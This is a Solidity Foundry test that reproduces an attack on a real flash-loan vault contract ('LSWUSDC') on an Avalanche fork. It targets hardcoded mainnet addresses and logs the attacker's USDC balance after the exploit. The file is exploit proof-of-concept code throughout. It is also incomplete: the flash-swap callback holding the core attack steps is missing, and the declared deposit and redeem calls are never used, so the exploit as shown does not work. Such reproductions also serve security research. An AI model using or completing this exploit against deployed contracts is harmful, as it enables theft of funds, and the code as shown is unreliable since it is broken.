// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

interface LSWUSDC {
    function maxFlashLoan(address token) external view returns(uint256);
    function flashFee(address token, uint256 amount) external view returns(uint256);
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
    function deposit(uint256 amount, address to) external returns(uint256);
    function redeem(uint256 shares, address receiver, address owner) external;
}
contract ContractTest is DSTest {
    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    LSWUSDC LSW = LSWUSDC(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);
    uint flashLoanAmount;
    uint flashLoanFee;
    uint depositAmount;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("Avalanche", 24003940);
    }
    
    function testExploit() public {
        flashLoanAmount = LSW.maxFlashLoan(address(USDC));
        flashLoanFee = LSW.flashFee(address(USDC), flashLoanAmount);
        Pair.swap(0, flashLoanAmount + flashLoanFee, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "[End] Attacker USDC balance after exploit",
            USDC.balanceOf(address(this)),
            6
        );
    }
}